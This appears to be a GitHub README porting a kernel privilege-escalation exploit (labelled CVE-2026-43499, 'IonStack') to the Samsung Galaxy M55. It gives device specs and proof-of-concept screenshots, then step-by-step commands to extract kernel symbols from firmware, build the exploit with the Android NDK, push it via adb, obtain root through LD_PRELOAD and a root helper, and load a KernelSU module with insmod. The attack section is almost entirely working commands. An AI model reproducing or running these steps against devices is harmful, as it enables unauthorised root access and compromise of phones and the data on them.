Profile ported to Samsung Galaxy M55: https://github.com/sarabpal-dev/IonStack-S22U. 
All credit goes to the respective authors.

======Specs=======
==================

- Device Name : Galaxy M55 5G
- Model: SM-M556B
- SoC : Qualcomm Snapdragon 7 Gen 1
- Fingerprint: samsung/m55xqddxx/qssi:14/UP1A.231005.007/M556BXXU4AYB4:user/release-keys
- Device : m55xq
- Board : taro
- Code Name : Android 14
- API Level : 34
- One UI : 6.1
- Security Patch Level : 2025-02-01
- Build Number : UP1A.231005.007.M556BXXU4AYB4
- Baseband : M556BXXU4AYB4,M556BXXU4AYB4
- Kernel : 5.10.226-android12-9-28566349-abM556BXXU4AYB4

https://github.com/user-attachments/assets/e4a82bdb-5545-4eee-8cf4-bfaba96494fc

<img width="1080" height="3346" alt="POC" src="https://github.com/user-attachments/assets/6e18aaeb-0a57-41f0-893d-6237536c557d" />
<img width="1080" height="2400" alt="POC" src="https://github.com/user-attachments/assets/5ebfcdd7-d0fa-44d1-899a-ca17e10f239d" />
<img width="1080" height="2400" alt="POC" src="https://github.com/user-attachments/assets/26aafb6e-ceb7-45cb-9009-ce81943675b4" />

# IF YOU WANT BUILD YOUR OWN M55 FOLLOW THE STEPS:
```sh
sudo apt update && upgrade
sudo apt install python3 python3-pip ipython3
```
```sh
pip install capstone
```
```sh
sudo apt-get update && sudo apt-get upgrade -y
sudo apt autoremove -y
sudo apt-get install gcc -y
```
```sh
git clone https://github.com/thiagobarrios/IonStack-M556B.git
```
```sh
cd IonStack-M556B/target_generator
```
put your "boot.img.lz4" (search your fm on samfw) inside "IonStack-M556B/target_generator/" and execute target_generator/lz4_to_image_kernel.py:
```sh
python3 lz4_to_image_kernel.py
```
```sh
gcc -O2 kallsyms.c -o kallsyms
```
```sh
./kallsyms Image
```
```sh
./extract-ikconfig Image > config.txt
```
keep Image file inside "target_generator" folder:
```sh
python3 generate_target.py kallsyms.txt config.txt Image --template target.h -o target.h
```
by yourself, create folder "/src/targets/M556BXXU4AYB4", copy target_generator/target.h and the folder "src/targets/X900XXU9DYE5/exp32" to  "/src/targets/M556BXXU4AYB4".
create Android folder, too:
```sh
mkdir -p ~/Android
```
```sh
cd ~/Android
```
download r27c ndk:
```sh
wget https://dl.google.com/android/repository/android-ndk-r27c-linux.zip
```
download and install unzip:
```sh
sudo apt install unzip
```
extract:
```sh
unzip android-ndk-r27c-linux.zip
```
delete zip file:
```sh
rm android-ndk-r27c-linux.zip
```
nano:
```sh
nano ~/.bashrc
```
add this lines in the end:
```sh
# Android NDK
export ANDROID_NDK_HOME=$HOME/Android/android-ndk-r27c
export PATH=$PATH:$ANDROID_NDK_HOME
```
save and exit (Ctrl+O → Enter → Ctrl+X):
```sh
source ~/.bashrc
```
show: /home/seu-usuario/Android/android-ndk-r27c:
```sh
echo $ANDROID_NDK_HOME
```
list ndk folders (build, ndk-build, toolchains, etc.):
```sh
ls $ANDROID_NDK_HOME
```
go for main:
```sh
cd IonStack-M556B
```
make:
```sh
make PROJECT=M556BXXU4AYB4 clean preload root-helper
```
on success, put this files on adb folder:
```sh
adb push cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push cve-exp32 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root

adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
adb shell "/data/local/tmp/cve-2026-43499-root"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"

adb install KernelSU_Next_v3.3.0-release.apk
adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"

```
